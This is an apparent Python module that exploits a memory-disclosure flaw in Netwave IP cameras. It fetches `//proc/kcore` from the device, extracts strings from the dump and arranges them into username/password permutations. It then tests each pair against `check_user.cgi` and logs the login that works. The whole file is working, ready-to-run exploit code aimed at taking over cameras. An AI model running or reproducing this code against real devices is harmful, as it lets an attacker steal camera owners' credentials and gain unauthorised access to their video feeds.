"""A module for interacting with Netwave IP cameras."""

from __future__ import annotations

import asyncio
import ipaddress
import itertools
import logging
import re
from dataclasses import dataclass
from datetime import datetime
from typing import Any, List, Optional, Set, Tuple

import aiohttp
import binary2strings
from tenacity import retry, retry_if_not_exception_type

logger = logging.getLogger(__name__)


@dataclass
class DeviceCredentials:
    """A class for representing the credentials of a Netwave IP camera."""

    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None

    def __str__(self) -> str:
        if self.username is None and self.password is None:
            return f"{self.host}:{self.port}"

        if self.password is None:
            return f"{self.username}@{self.host}:{self.port}"

        return f"{self.username}:{self.password}@{self.host}:{self.port}"

    def __bool__(self) -> bool:
        return self.username is not None


@dataclass
class ExtractedString:
    """A class for representing a string that was extracted from binary data."""

    value: str
    encoding: str
    span: Tuple[int, int]
    is_interesting: bool

    def __str__(self) -> str:
        return self.value

    def __hash__(self) -> int:
        return hash(self.value)

    def __eq__(self, __value: object, /) -> bool:
        if isinstance(__value, ExtractedString):
            return self.value == __value.value

        if isinstance(__value, str):
            return self.value == __value

        return NotImplemented

    def __contains__(self, __value: object, /) -> bool:
        if isinstance(__value, ExtractedString):
            return __value.value in self.value

        if isinstance(__value, str):
            return __value in self.value

        return NotImplemented


class NetwaveDevice:
    """
    A class for interacting with a Netwave IP camera.

    Parameters
    ----------
    host : str
        The host of the Netwave IP camera.
    port : int
        The port of the Netwave IP camera.
    """

    def __init__(self, host: str, port: int) -> None:
        self._host = host
        self._port = port
        self._session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(30))

    def __str__(self) -> str:
        return f"{self._host}:{self._port}"

    def __repr__(self) -> str:
        return f"{self.__class__.__name__}(host={self._host!r}, port={self._port!r})"

    async def __aenter__(self) -> NetwaveDevice:
        return self

    async def __aexit__(self, *_: Any) -> None:
        await self.close()

    @staticmethod
    def _filter_strings(
        device_id: str, strings: List[ExtractedString]
    ) -> List[ExtractedString]:
        """
        Remove unwanted strings such as IP addresses,
        domain names, and email addresses.

        Parameters
        ----------
        device_id : str
            The device ID of the Netwave IP camera.
        strings : List[ExtractedString]
            The strings to filter.

        Returns
        -------
        List[ExtractedString]
            The filtered strings.
        """
        filtered_strings: Set[ExtractedString] = set()
        domain_pattern = re.compile(r"[a-z0-9-]+\.[a-z0-9-]+\.[a-z]+")
        email_pattern = re.compile(r"[a-z0-9_.+-]+@[a-z0-9-]+\.[a-z0-9-.]+")

        for string in itertools.dropwhile(lambda string: string != device_id, strings):
            if (
                string == device_id
                or string.encoding == "WIDE_STRING"
                or any(char in string for char in (" ", ":"))
                or email_pattern.fullmatch(string.value) is not None
                or domain_pattern.fullmatch(string.value) is not None
            ):
                continue

            try:
                string.value.encode("ascii")
            except UnicodeEncodeError:
                continue

            try:
                ipaddress.ip_address(string.value)
            except ValueError:
                filtered_strings.add(string)

        return list(filtered_strings)

    def _get_possible_credentials(
        self, device_id: str, memory: bytes
    ) -> List[DeviceCredentials]:
        """
        Get the possible credentials of the Netwave IP camera.

        Parameters
        ----------
        device_id : str
            The device ID of the Netwave IP camera.
        memory : bytes
            The memory data of the Netwave IP camera.

        Returns
        -------
        List[DeviceCredentials]
            A list of possible credentials for the Netwave IP camera.
        """
        strings = [
            ExtractedString(*string)
            for string in binary2strings.extract_all_strings(
                memory, only_interesting=True
            )
        ]

        filtered_strings = self._filter_strings(device_id, strings)

        if not filtered_strings:
            return []

        possible_credentials = list(itertools.permutations(filtered_strings, 2))

        possible_credentials.sort(
            key=lambda credentials: "admin" in credentials[0], reverse=True
        )

        credentials = [
            DeviceCredentials(
                self._host, self._port, credentials[0].value, credentials[1].value
            )
            for credentials in possible_credentials
        ]

        credentials.extend(
            [
                DeviceCredentials(self._host, self._port, credentials[0].value)
                for credentials in possible_credentials
            ]
        )

        return credentials

    async def _dump_memory(self, device_id: str) -> List[DeviceCredentials]:
        """
        Dump the memory of the Netwave IP camera and retrieve possible credentials.

        Parameters
        ----------
        device_id : str
            The device ID of the Netwave IP camera.

        Returns
        -------
        List[DeviceCredentials]
            A list of possible credentials for the Netwave IP camera.
        """
        async with self._session.get(
            f"http://{self}//proc/kcore", timeout=aiohttp.ClientTimeout(0)
        ) as response:
            if (
                response.status != 200
                or response.headers.get("Server") != "Netwave IP Camera"
            ):
                logger.error("[%s] Device is not vulnerable", self)
                return []

            logger.info("[%s] Dumping memory...", self)

            async for chunk in response.content.iter_any():
                possible_credentials = self._get_possible_credentials(device_id, chunk)

                if not possible_credentials:
                    continue

                return possible_credentials

            logger.error("[%s] Could not find device ID in memory dump", self)
            return []

    async def _get_valid_credentials(
        self, possible_credentials: List[DeviceCredentials]
    ) -> Optional[DeviceCredentials]:
        """
        Get the valid credentials from a list of possible credentials.

        Parameters
        ----------
        credentials : List[DeviceCredentials]
            The list of possible credentials for the Netwave IP camera.

        Returns
        -------
        Optional[DeviceCredentials]
            The valid credentials for the Netwave IP camera.
            Returns None if no valid credentials were found.
        """
        for credentials in possible_credentials:
            if not await self._check_credentials(credentials):
                continue

            if credentials.password is None:
                logger.info(
                    "[%s] Found valid credentials: %s",
                    self,
                    credentials.username,
                )
            else:
                logger.info(
                    "[%s] Found valid credentials: %s:%s",
                    self,
                    credentials.username,
                    credentials.password,
                )

            return credentials

        logger.error("[%s] Could not find valid credentials in memory dump", self)
        return None

    @retry(retry=retry_if_not_exception_type((ValueError, asyncio.CancelledError)))
    async def _check_credentials(self, credentials: DeviceCredentials) -> bool:
        """
        Check if the given credentials are valid.

        Parameters
        ----------
        credentials : DeviceCredentials
            The credentials to check.

        Returns
        -------
        bool
            Whether the credentials are valid.
        """
        if not credentials:
            return False

        if credentials.password is None:
            auth = aiohttp.BasicAuth(credentials.username)
        else:
            auth = aiohttp.BasicAuth(credentials.username, credentials.password)

        async with self._session.get(
            f"http://{self}/check_user.cgi", auth=auth
        ) as response:
            if response.status != 200:
                return False

            try:
                text = await response.text()
            except UnicodeDecodeError:
                return False

        if re.match(r"var user='.+';\n?var pwd='.*';\n?var pri=\d;", text) is None:
            return False

        return True

    @property
    def host(self) -> str:
        """The host of the Netwave IP camera."""
        return self._host

    @property
    def port(self) -> int:
        """The port of the Netwave IP camera."""
        return self._port

    async def close(self) -> None:
        """Close the session."""
        await self._session.close()

    async def get_device_id(self) -> Optional[str]:
        """
        Get the device ID of the Netwave IP camera.

        Returns
        -------
        Optional[str]
            The device ID of the Netwave IP camera.
            Returns None if the device ID could not be found.
        """
        async with self._session.get(f"http://{self}/get_status.cgi") as response:
            if response.status != 200:
                logger.error("[%s] Could not get device ID", self)
                return None

            try:
                text = await response.text()
            except UnicodeDecodeError:
                logger.error("[%s] Could not decode status response", self)
                return None

        for line in text.splitlines():
            device_id_match = re.match(r"var id='([0-9A-F]{12})';", line)

            if device_id_match is None:
                continue

            return device_id_match.group(1)

        logger.error("[%s] Could not find device ID in status response", self)
        return None

    async def get_credentials(
        self, device_id: Optional[str] = None, *, timeout: int = 300
    ) -> Optional[DeviceCredentials]:
        """
        Get the credentials of the Netwave IP camera.

        Parameters
        ----------
        device_id : str, optional
            The device ID of the Netwave IP camera, by default None.
            If None, the device ID will be retrieved.
        timeout : int, optional
            The timeout in seconds for retrieving the credentials from the memory dump,
            by default 300.

        Returns
        -------
        DeviceCredentials
            The credentials of the Netwave IP camera.
            Returns None if the credentials could not be found.
        """
        try:
            device_id = device_id or await self.get_device_id()
        except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError):
            logger.error("[%s] Could not get device ID", self)
            return None

        if device_id is None:
            return None

        logger.info("[%s] Device ID: %s", self, device_id)
        start = datetime.now()

        try:
            possible_credentials = await asyncio.wait_for(
                self._dump_memory(device_id), timeout=timeout
            )
        except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError):
            logger.error("[%s] Could not dump memory", self)
            return None

        if not possible_credentials:
            return None

        remaining_time = timeout - (datetime.now() - start).total_seconds()

        logger.info(
            "[%s] Found %s possible credentials", self, f"{len(possible_credentials):,}"
        )

        try:
            credentials = await asyncio.wait_for(
                self._get_valid_credentials(possible_credentials),
                timeout=remaining_time,
            )
        except (asyncio.TimeoutError, asyncio.CancelledError):
            logger.error("[%s] Could not get valid credentials", self)
            return None

        if credentials is None:
            return None

        return credentials
